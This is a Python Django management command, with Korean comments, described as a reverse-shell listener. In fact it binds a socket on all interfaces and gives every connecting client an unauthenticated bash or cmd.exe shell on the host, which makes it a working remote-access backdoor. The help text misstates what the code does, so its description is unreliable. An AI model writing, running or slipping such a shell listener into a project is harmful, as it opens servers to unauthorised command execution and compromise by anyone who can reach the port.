import socket
import threading
import subprocess
import os
import sys
from time import sleep

from django.core.management.base import BaseCommand

# 클라이언트와 셸 간의 양방향 통신을 처리하는 함수
def handle_io(client_socket, target_shell):
    # 1. 클라이언트(소켓)에서 들어오는 데이터를 셸 프로세스의 표준 입력(stdin)으로 전달하는 스레드
    def client_to_shell():
        try:
            while True:
                # 클라이언트로부터 4096 바이트 수신
                data = client_socket.recv(4096)
                if not data:
                    break
                # 수신된 데이터를 셸 프로세스의 표준 입력에 씁니다.
                # 참고: 셸 명령어는 항상 \n을 \r\n으로 처리해야 합니다.
                target_shell.stdin.write(data)
                target_shell.stdin.flush()
        except Exception as e:
            # print(f"[C2S Error] {e}", file=sys.stderr)
            pass

    # 2. 셸 프로세스의 표준 출력/에러(stdout/stderr)를 클라이언트(소켓)로 전달하는 스레드
    def shell_to_client():
        try:
            while True:
                # 셸 프로세스의 표준 출력/에러에서 1바이트씩 데이터를 읽어옴 (비동기 처리)
                # target_shell.stdout.read(1)은 블로킹을 방지하기 위해 사용
                output = target_shell.stdout.read(1)
                if output:
                    client_socket.sendall(output)
                
                # 에러 출력도 함께 전달
                error_output = target_shell.stderr.read(1)
                if error_output:
                    client_socket.sendall(error_output)

        except Exception as e:
            # print(f"[S2C Error] {e}", file=sys.stderr)
            pass

    # 통신 스레드 시작
    c2s_thread = threading.Thread(target=client_to_shell)
    s2c_thread = threading.Thread(target=shell_to_client)
    
    # 셸의 I/O를 비동기로 만들기 위해 파일 디스크립터를 non-blocking으로 설정
    if os.name != 'nt': # Windows에서는 사용할 수 없는 경우가 많으므로 Linux/macOS에만 적용
        try:
            import fcntl
            flags = fcntl.fcntl(target_shell.stdout.fileno(), fcntl.F_GETFL)
            fcntl.fcntl(target_shell.stdout.fileno(), fcntl.F_SETFL, flags | os.O_NONBLOCK)
            
            flags = fcntl.fcntl(target_shell.stderr.fileno(), fcntl.F_GETFL)
            fcntl.fcntl(target_shell.stderr.fileno(), fcntl.F_SETFL, flags | os.O_NONBLOCK)
        except:
             pass # fcntl이 없는 시스템은 건너뜀
    
    c2s_thread.daemon = True
    s2c_thread.daemon = True
    c2s_thread.start()
    s2c_thread.start()
    
    # 두 스레드가 종료될 때까지 대기하거나, 셸 프로세스가 종료될 때까지 대기
    # 이 부분이 없으면 메인 함수가 종료되어 셸이 닫힙니다.
    c2s_thread.join()
    s2c_thread.join()


class Command(BaseCommand):
    help = 'Starts a TCP listener to wait for a reverse shell connection.'

    def add_arguments(self, parser):
        parser.add_argument('--port', type=int, default=10000, help='The port to listen on.')

    def handle(self, *args, **options):
        port = options['port']
        listen_ip = '0.0.0.0'
        
        # 셸 명령어 설정 (Windows: cmd.exe, Linux/macOS: /bin/bash)
        shell_cmd = ['cmd.exe'] if os.name == 'nt' else ['/bin/bash']

        self.stdout.write(self.style.SUCCESS(f"--- 리버스 셸 리스너 시작: {listen_ip}:{port} ---"))

        # 소켓 설정
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((listen_ip, port))
            s.listen(1)
            
        except Exception as e:
            self.stderr.write(self.style.ERROR(f"소켓 바인딩 에러: {e}"))
            return

        # 🚨 연결을 수락하는 지속적인 루프
        while True:
            try:
                self.stdout.write(f"포트 {port}에서 클라이언트 연결 대기 중...")
                
                # 연결 수락 - 블로킹 상태
                client_socket, client_addr = s.accept()
                
                self.stdout.write(self.style.SUCCESS(f"\n--- 리버스 셸 연결 성공: {client_addr[0]}:{client_addr[1]} ---"))

                # 셸 프로세스 시작
                # stdin, stdout, stderr을 파이프라인으로 설정하여 제어권을 갖습니다.
                target_shell = subprocess.Popen(
                    shell_cmd, 
                    stdin=subprocess.PIPE, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    shell=True,
                    # text 모드는 사용하지 않음 (바이너리 데이터 통신을 위해)
                )

                # 입출력 처리 함수 실행 (지속적인 통신 루프 시작)
                handle_io(client_socket, target_shell)
                
                # 셸 프로세스가 종료될 때까지 대기
                target_shell.wait()
                
                self.stdout.write(self.style.WARNING("--- 셸 프로세스 종료됨 ---"))

            except KeyboardInterrupt:
                self.stdout.write(self.style.WARNING("\n리스너 종료 요청..."))
                break
            except Exception as e:
                self.stderr.write(self.style.ERROR(f"처리 중 예외 발생: {e}"))
            finally:
                try:
                    client_socket.close()
                except:
                    pass
        
        s.close()
        self.stdout.write(self.style.SUCCESS("리스너가 안전하게 종료되었습니다."))